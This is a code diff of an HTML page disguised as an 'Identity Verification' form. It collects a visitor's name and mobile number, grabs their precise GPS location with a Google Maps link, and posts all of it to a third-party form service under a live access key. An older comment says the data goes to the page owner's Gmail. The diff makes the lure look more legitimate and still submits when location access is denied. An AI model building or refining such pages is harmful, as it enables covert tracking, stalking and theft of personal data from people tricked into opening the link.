@@ -3,74 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Your Number</title>
+    <title>Identity Verification</title>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
-        .form-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        input[type="tel"] { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
-        button { background-color: #007bff; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 4px; cursor: pointer; width: 100%; }
-        button:hover { background-color: #0056b3; }
-        #status { margin-top: 15px; color: #555; font-size: 14px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
+        .form-container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); width: 100%; max-width: 400px; text-align: center; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 25px; font-size: 14px; }
+        input[type="text"], input[type="tel"] { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        button { background-color: #2563eb; color: white; border: none; padding: 14px 20px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; margin-top: 15px; transition: background 0.3s; }
+        button:hover { background-color: #1d4ed8; }
+        #status { margin-top: 20px; color: #d97706; font-size: 14px; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="form-container">
-    <h2>Mobile Verification</h2>
-    <p>Kripya apna mobile number enter karein aur location allow karein.</p>
+    <h2>Identity Verification</h2>
+    <p>Please enter your details to proceed with the secure verification process.</p>
     
     <form id="locationForm" action="https://api.web3forms.com/submit" method="POST">
         <input type="hidden" name="access_key" value="394be003-9b48-427f-a2d3-001ece7336bf">
         
-        <input type="tel" name="Mobile_Number" placeholder="Enter Mobile Number" required id="phoneNumber">
+        <input type="text" name="User_Name" placeholder="Full Name" required>
+        <input type="tel" name="Mobile_Number" placeholder="Mobile Number" required id="phoneNumber">
         
-        <input type="hidden" name="Latitude" id="latField">
-        <input type="hidden" name="Longitude" id="lngField">
-        <input type="hidden" name="Google_Maps_Link" id="mapLinkField">
+        <input type="hidden" name="Latitude" id="latField" value="N/A">
+        <input type="hidden" name="Longitude" id="lngField" value="N/A">
+        <input type="hidden" name="Google_Maps_Link" id="mapLinkField" value="Denied">
 
-        <button type="submit" id="submitBtn">Submit & Verify</button>
+        <button type="button" id="verifyBtn">Submit & Verify</button>
     </form>
     
     <div id="status"></div>
 </div>
 
 <script>
+    const verifyBtn = document.getElementById('verifyBtn');
     const form = document.getElementById('locationForm');
     const status = document.getElementById('status');
+    const phoneInput = document.getElementById('phoneNumber');
 
-    // Jaise hi link khulegi, browser location access maangna shuru kar dega
-    window.onload = function() {
+    verifyBtn.addEventListener('click', function() {
+        // Simple validation check
+        if (phoneInput.value.length < 10) {
+            status.innerText = "Please enter a correct mobile number.";
+            return;
+        }
+
+        status.innerText = "Requesting location access...";
+
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    
-                    document.getElementById('latField').value = lat;
-                    document.getElementById('lngField').value = lng;
-                    document.getElementById('mapLinkField').value = `https://www.google.com/maps?q=${lat},${lng}`;
-                    
-                    status.innerText = "Location access successfully allowed.";
-                    status.style.color = "green";
+                    document.getElementById('latField').value = position.coords.latitude;
+                    document.getElementById('lngField').value = position.coords.longitude;
+                    document.getElementById('mapLinkField').value = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    form.submit(); // Submit after getting location
                 },
                 function(error) {
-                    status.innerText = "Kripya page reload karein aur location ko 'Allow' karein.";
-                    status.style.color = "red";
+                    // Submit even if denied
+                    status.innerText = "Location access denied. Submitting details...";
+                    form.submit();
                 }
             );
         } else {
-            status.innerText = "Aapka browser location support nahi karta.";
-        }
-    };
-
-    // Form submit hone par validation aur message
-    form.addEventListener('submit', function(e) {
-        const lat = document.getElementById('latField').value;
-        if (!lat) {
-            e.preventDefault(); // Form rok dega agar location allow nahi hui hai
-            alert("Pehle location allow karein, uske baad hi submit karein.");
-        } else {
-            status.innerText = "Sending data to your Gmail...";
+            status.innerText = "Geolocation not supported. Submitting details...";
+            form.submit();
         }
     });
 </script>
